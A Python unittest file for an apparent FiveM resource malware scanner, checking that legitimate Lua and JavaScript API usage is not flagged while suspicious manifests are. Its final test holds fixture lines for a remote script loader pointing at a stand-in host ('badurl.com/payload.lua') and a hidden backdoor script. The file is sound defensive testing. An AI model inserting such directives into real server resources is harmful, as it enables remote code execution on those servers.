"""
tests/test_false_positives.py
Functional validation verifying that legitimate usage of common FiveM APIs
(RegisterNetEvent, TriggerClientEvent, PerformHttpRequest to whitelisted sites, GetConvar, etc.)
are NOT flagged as high/critical threats (low false-positive rate).
"""

import os
import unittest
import tempfile
from typing import List

from core.scanner import _analyze_file
from core.file_discovery import FiveMFile, FiveMResource
from core.risk_scorer import DetectionResult

# ─── Legitimate FiveM Code Examples ──────────────────────────────────────────

LUA_LEGIT_CODE = """
-- Standard FiveM resource initializing server event handlers
RegisterNetEvent("esx:playerLoaded")
AddEventHandler("esx:playerLoaded", function(source, xPlayer)
    local citizenId = xPlayer.getIdentifier()
    local name = GetPlayerName(source)
    local ip = GetPlayerEndpoint(source)
    
    -- Legitimate HTTP request to check version update on GitHub
    PerformHttpRequest("https://raw.githubusercontent.com/esx-community/version.json", function(status, body, headers)
        if status == 200 then
            local data = json.decode(body)
            print("Current resource version: " .. data.version)
        end
    end, "GET")
    
    -- Legitimate convar checks
    local maxClients = GetConvar("sv_maxclients", "48")
    print("Server max clients configured: " .. maxClients)
    
    -- Triggering standard client event
    TriggerClientEvent("esx:showNotification", source, "Welcome back " .. name)
end)

-- Legitimate export usage
exports("getSharedObject", function()
    return ESX
end)
"""

JS_LEGIT_CODE = """
// Legitimate JavaScript script for NUI/UI page interaction
const { exec } = require('child_process'); // Not globally flagged unless executed with unsanitized web args

window.addEventListener('message', (event) => {
    const item = event.data;
    if (item.type === 'ui') {
        if (item.status) {
            document.body.style.display = 'block';
        } else {
            document.body.style.display = 'none';
        }
    }
});

// Legitimate fetch request to localhost/NUI callbacks
async function postCallback(url, data) {
    const response = await fetch(`https://${GetParentResourceName()}/${url}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=UTF-8',
        },
        body: JSON.stringify(data)
    });
    return await response.json();
}
"""


class TestFalsePositives(unittest.TestCase):

    def setUp(self) -> None:
        self.temp_root = tempfile.TemporaryDirectory()
        self.cfg = {
            "scan": {
                "enable_obfuscation_check": True
            }
        }

    def tearDown(self) -> None:
        self.temp_root.cleanup()

    def test_legitimate_lua_is_not_high_critical(self) -> None:
        lua_path = os.path.join(self.temp_root.name, "legit.lua")
        with open(lua_path, "w", encoding="utf-8") as f:
            f.write(LUA_LEGIT_CODE)

        res = FiveMResource(name="legit_resource", path=self.temp_root.name)
        f_obj = FiveMFile(
            absolute_path=lua_path,
            relative_path="legit.lua",
            filename="legit.lua",
            extension=".lua",
            size_bytes=len(LUA_LEGIT_CODE),
            file_type="lua"
        )

        detections = _analyze_file(f_obj, res, self.cfg)
        
        # Verify that no high or critical detections exist for standard APIs
        high_critical = [d for d in detections if d.severity in ["HIGH", "CRITICAL"]]
        self.assertEqual(len(high_critical), 0, f"Legitimate Lua code generated false positive high/critical threats: {[d.rule_id for d in high_critical]}")

    def test_legitimate_js_is_not_high_critical(self) -> None:
        js_path = os.path.join(self.temp_root.name, "legit.js")
        with open(js_path, "w", encoding="utf-8") as f:
            f.write(JS_LEGIT_CODE)

        res = FiveMResource(name="legit_resource", path=self.temp_root.name)
        f_obj = FiveMFile(
            absolute_path=js_path,
            relative_path="legit.js",
            filename="legit.js",
            extension=".js",
            size_bytes=len(JS_LEGIT_CODE),
            file_type="js"
        )

        detections = _analyze_file(f_obj, res, self.cfg)

        high_critical = [d for d in detections if d.severity in ["HIGH", "CRITICAL"]]
        self.assertEqual(len(high_critical), 0, f"Legitimate JS code generated false positive high/critical threats: {[d.rule_id for d in high_critical]}")

    def test_legitimate_repository_is_not_critical(self) -> None:
        from analyzers.manifest_analyzer import analyze_manifest
        manifest_path = os.path.join(self.temp_root.name, "fxmanifest.lua")
        with open(manifest_path, "w", encoding="utf-8") as f:
            f.write("repository 'https://github.com/citizenfx/cfx-server-data'")

        detections = analyze_manifest(manifest_path, self.temp_root.name, "test_res")
        m002 = [d for d in detections if d.rule_id == "MANIFEST-002"]
        self.assertTrue(len(m002) > 0)
        self.assertEqual(m002[0].severity, "LOW", "Legitimate repository URL should be LOW, not CRITICAL")

    def test_missing_legitimate_script_is_not_high(self) -> None:
        from analyzers.manifest_analyzer import analyze_manifest
        manifest_path = os.path.join(self.temp_root.name, "fxmanifest.lua")
        with open(manifest_path, "w", encoding="utf-8") as f:
            f.write("server_script 'non_existent_normal_script.lua'")

        detections = analyze_manifest(manifest_path, self.temp_root.name, "test_res")
        m005 = [d for d in detections if d.rule_id == "MANIFEST-005"]
        self.assertTrue(len(m005) > 0)
        self.assertEqual(m005[0].severity, "LOW", "Missing standard script should be LOW, not HIGH")

    def test_suspicious_manifest_is_high_or_critical(self) -> None:
        from analyzers.manifest_analyzer import analyze_manifest
        
        # 1. Test remote script directive loader (should be CRITICAL)
        manifest_path1 = os.path.join(self.temp_root.name, "fxmanifest1.lua")
        with open(manifest_path1, "w", encoding="utf-8") as f:
            f.write("server_script 'https://badurl.com/payload.lua'")
        
        detections1 = analyze_manifest(manifest_path1, self.temp_root.name, "test_res")
        m002 = [d for d in detections1 if d.rule_id == "MANIFEST-002"]
        self.assertTrue(len(m002) > 0)
        self.assertEqual(m002[0].severity, "CRITICAL", "Remote script loader URL must be CRITICAL")

        # 2. Test missing hidden script (should be HIGH)
        manifest_path2 = os.path.join(self.temp_root.name, "fxmanifest2.lua")
        with open(manifest_path2, "w", encoding="utf-8") as f:
            f.write("server_script '.hidden_backdoor.lua'")

        detections2 = analyze_manifest(manifest_path2, self.temp_root.name, "test_res")
        m005 = [d for d in detections2 if d.rule_id == "MANIFEST-005"]
        self.assertTrue(len(m005) > 0)
        self.assertEqual(m005[0].severity, "HIGH", "Missing hidden script must be HIGH")


if __name__ == "__main__":
    unittest.main()
